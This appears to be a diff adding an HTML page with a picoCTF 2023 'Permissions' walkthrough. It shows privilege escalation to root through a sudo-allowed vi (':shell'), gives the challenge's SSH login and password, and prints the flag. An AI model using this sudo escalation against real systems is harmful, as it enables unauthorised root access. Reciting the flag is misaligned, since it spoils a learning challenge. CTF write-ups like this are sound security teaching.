@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>picoCTF Permissions @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>picoCTF General Skills Guide</h1>
+        <p>here's how to solve Permissions</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the General Skills Guides</a>
+            <hr>
+            <h2>Permissions</h2>
+            <pre>Name: Permissions
+Description: Can you read files in the root file? The system admin has provisioned an account for you on the main server: ssh -p 52418 picoplayer@saturn.picoctf.net Password: j4ks-9nxB- Can you login and read the root file?
+Author: Geoffrey Njogu
+Tags: Medium, General Skills, picoCTF 2023, vim
+Challenge from: picoCTF 2023
+Hints:
+1. What permissions do you have?</pre>
+            <h2>Theory</h2>
+            <p>According to the description, to get the flag we have to look for a way to get administrator permissions inside an SSH machine. We don't get much more information so we'll move on to the solution part. Also if we want to know how to get administrator permission to get the flag, first we'll need to know what permissions we have with sudo, the command that gives administrator powers to other commands, for that we can list all the commands that we're allowed to use with sudo and the -l option, like this:</p>
+            <pre>sudo -l</pre>
+            <h2>Solution</h2>
+            <p>First we'll enter into the SSH with the command we're given on the description, then use the sudo command from theory to list all our admin powers:</p>
+            <pre>shukularuni@SHUKULAP:~$ ssh -p 52418 picoplayer@saturn.picoctf.net
+picoplayer@saturn.picoctf.net's password: j4ks-9nxB-
+
+picoplayer@challenge:~$ ls /root/
+ls: cannot open directory '/root/': Permission denied
+
+picoplayer@challenge:~$ sudo -l
+[sudo] password for picoplayer: j4ks-9nxB-
+Matching Defaults entries for picoplayer on challenge:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User picoplayer may run the following commands on challenge:
+    (ALL) /usr/bin/vi</pre>
+            <p>And would you look at that! We can use a singular command with sudo, and it's the Vim editor. I remember a long time ago when I had to enter another shell from inside Vim. All we need to do is run Vim as admin (with sudo), and type the colon (:) character to be able to enter commands from inside Vim (we're inside Vim as admin because of sudo), and if we type the command shell inside Vim we'll hopefully get the root shell, where we can view the root folder with no problem:</p>
+            <pre>picoplayer@challenge:~$ sudo vi</pre>
+            <pre>~
+~
+~
+: shell</pre>
+            <pre>root@challenge:/home/picoplayer# sudo echo "IM ADMIN"
+IM ADMIN</pre>
+            <p>Perfect! We're inside the same shell, but now as root, this means that we're now able to enter into the root folder and look for the flag:</p>
+            <pre>root@challenge:~# ls
+
+root@challenge:~# ls -la /root/
+total 12
+drwx------ 1 root root   23 Aug  4  2023 .
+drwxr-xr-x 1 root root   51 Apr 11 10:52 ..
+-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
+-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
+-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
+
+root@challenge:~# cat .flag.txt
+picoCTF{uS1ng_v1m_3dit0r_021d10ab}</pre>
+            <p>There we go! That's the flag.</p>
+            <p>The flag file seemed to be hidden so I added -a option to view all files regardless if they're hidden, and also the option -l to view extra information just in case. Now, to exit this state just type exit, which will take you back to Vim, where you have to type colon to start a command, and type q to quit, then exit again to this time exit the SSH shell.</p>
+            <p>I rated this level as "good"! :3</p>
+            <hr>
+            <a target="_blank" href="https://play.picoctf.org/practice/challenge/363">https://play.picoctf.org/practice/challenge/363</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
